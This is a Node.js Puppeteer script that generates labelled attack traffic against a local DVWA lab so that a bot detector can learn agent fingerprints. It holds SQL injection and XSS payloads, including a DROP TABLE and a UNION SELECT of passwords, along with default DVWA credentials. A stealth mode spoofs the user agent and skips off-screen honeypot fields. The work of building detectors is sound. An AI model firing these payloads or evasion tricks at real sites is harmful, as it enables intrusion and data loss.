// Puppeteer spray-bot — Chromium driven via Node + CDP.
//
// Sibling to playwright_bot/bot.py and selenium_bot/bot.py: same engine
// underneath, but a different runtime stack and HTTP client surface,
// which gives the detector a third agent-family fingerprint to learn
// from. Class = agent, family = puppeteer_bot.
//
// X-Cernis-* labels travel on every request via page.setExtraHTTPHeaders.
// Provenance is written via the in-page fetch (inherits cookies from
// the browser jar, including the cernis_sid the proxy mints on first nav).
// Target-guard runs as a pre-exec sh step in the Dockerfile so this
// process never starts against a non-loopback target.

import { createHash } from 'node:crypto';
import puppeteer from 'puppeteer-core';

const LABEL = 'puppeteer_bot';
const TARGET = process.env.CERNIS_TARGET || 'http://capture:8080';
const TARGET_APP = (process.env.CERNIS_TARGET_APP || 'dvwa').toLowerCase();
const SECURITY_LEVEL = process.env.DVWA_SECURITY_LEVEL || 'low';
const SESSIONS = parseInt(process.env.CERNIS_SESSIONS || '3', 10);
const DVWA_USER = process.env.DVWA_USER || 'admin';
const DVWA_PASS = process.env.DVWA_PASS || 'password';
const STEALTH = ['1', 'true', 'yes'].includes(
    (process.env.CERNIS_STEALTH || 'false').toLowerCase()
);
const STEALTH_UA = (
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ' +
    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
);

function humanPause() {
    if (!STEALTH) return Promise.resolve();
    const ms = 2500 + Math.random() * 4000;
    return new Promise((res) => setTimeout(res, ms));
}

const PAYLOADS = [
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "'; DROP TABLE users--",
    "<img src=x onerror=alert(1)>",
    "1 UNION SELECT user,password FROM users--",
];

const VULN_PATHS = [
    '/vulnerabilities/sqli/',
    '/vulnerabilities/xss_r/',
    '/vulnerabilities/xss_s/',
    '/vulnerabilities/exec/',
];

function configSha(cfg) {
    const blob = JSON.stringify(
        Object.keys(cfg).sort().reduce((o, k) => (o[k] = cfg[k], o), {})
    );
    return createHash('blake2b512').update(blob).digest('hex').slice(0, 8);
}

function buildPayload(klass, family, generator, version, config) {
    return {
        class: klass,
        family,
        target_app: TARGET_APP,
        security_level: SECURITY_LEVEL,
        stealth: false,
        generator,
        generator_version: version,
        generator_config_sha: configSha(config || {}),
        extra: {},
    };
}

function labelHeaders(payload) {
    return {
        'X-Cernis-Source': payload.family,
        'X-Cernis-Class': payload.class,
        'X-Cernis-Family': payload.family,
        'X-Cernis-TargetApp': payload.target_app,
        'X-Cernis-SecurityLevel': payload.security_level,
        'X-Cernis-Stealth': payload.stealth ? 'true' : 'false',
    };
}

async function recordProvenance(page, payload) {
    try {
        await page.evaluate(async (p) => {
            await fetch('/__provenance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(p),
                credentials: 'include',
            });
        }, payload);
    } catch (err) {
        console.error(`[${LABEL}] provenance write failed (continuing): ${err}`);
    }
}

async function loginDvwa(page) {
    await page.goto(`${TARGET}/login.php`, { waitUntil: 'domcontentloaded' });
    await page.type('input[name="username"]', DVWA_USER);
    await page.type('input[name="password"]', DVWA_PASS);
    await Promise.all([
        page.waitForNavigation({ waitUntil: 'domcontentloaded' }).catch(() => {}),
        page.click('input[name="Login"]'),
    ]);
}

async function attackPage(page, path) {
    try {
        await page.goto(`${TARGET}${path}`, {
            waitUntil: 'domcontentloaded', timeout: 10000,
        });
    } catch {
        return;
    }
    let inputs = await page.$$(
        'input[type="text"]:not([disabled]):not([readonly]), textarea:not([disabled]):not([readonly])'
    );
    if (!inputs.length) return;
    const payload = PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)];
    if (STEALTH) {
        // Drop off-screen / aria-hidden inputs (the invisible_field
        // honeypot is positioned at -9999px) — fill ONE visible input
        // with a human-typed payload.
        const visible = [];
        for (const inp of inputs) {
            try {
                const box = await inp.boundingBox();
                if (!box) continue;
                if (box.x < 0 || box.y < 0) continue;
                if (box.width < 5 || box.height < 5) continue;
                visible.push(inp);
            } catch {}
        }
        if (!visible.length) return;
        try {
            await visible[0].click({ clickCount: 1 });
            await visible[0].type(payload, { delay: 80 + Math.random() * 100 });
        } catch {}
    } else {
        for (const inp of inputs) {
            try { await inp.evaluate((el) => (el.value = '')); } catch {}
            try { await inp.type(payload); } catch {}
        }
    }
    try {
        const submit = await page.$('input[type="submit"], button[type="submit"]');
        if (submit) await submit.click();
        await page.waitForNetworkIdle({ idleTime: 200, timeout: 3000 }).catch(() => {});
    } catch {}
    await humanPause();
}

async function runSession(browser, sessionIdx) {
    const payload = buildPayload(
        'agent', LABEL, 'puppeteer_bot', '0.2.0',
        { engine: 'puppeteer', paths: VULN_PATHS, stealth: STEALTH },
    );
    payload.stealth = STEALTH;
    const headers = labelHeaders(payload);
    if (STEALTH) headers['User-Agent'] = STEALTH_UA;

    const context = await browser.createBrowserContext();
    const page = await context.newPage();
    if (STEALTH) await page.setUserAgent(STEALTH_UA);
    await page.setExtraHTTPHeaders(headers);

    let pages = 0;
    try {
        await page.goto(`${TARGET}/`, { waitUntil: 'domcontentloaded' }).catch(() => {});
        await recordProvenance(page, payload);

        if (TARGET_APP === 'dvwa') {
            await loginDvwa(page);
            for (const path of VULN_PATHS) {
                await attackPage(page, path);
                pages++;
            }
        } else {
            for (const path of ['/', '/login', '/api']) {
                try {
                    await page.goto(`${TARGET}${path}`, { waitUntil: 'domcontentloaded' });
                    pages++;
                } catch {}
            }
        }
    } finally {
        try { await context.close(); } catch {}
    }
    return pages;
}

async function main() {
    const mode = STEALTH ? 'stealth' : 'fast';
    console.log(`[${LABEL}] target=${TARGET} target_app=${TARGET_APP} mode=${mode} sessions=${SESSIONS}`);
    const browser = await puppeteer.launch({
        headless: true,
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium',
        args: ['--no-sandbox', '--disable-dev-shm-usage', '--window-size=1280,800'],
    });
    try {
        for (let i = 0; i < SESSIONS; i++) {
            const t0 = Date.now();
            const pages = await runSession(browser, i);
            console.log(
                `[${LABEL}] session ${i + 1}/${SESSIONS} pages=${pages} ` +
                `took=${((Date.now() - t0) / 1000).toFixed(1)}s`
            );
        }
    } finally {
        await browser.close();
    }
    console.log(`[${LABEL}] done`);
}

main().catch((err) => {
    console.error(err);
    process.exit(1);
});
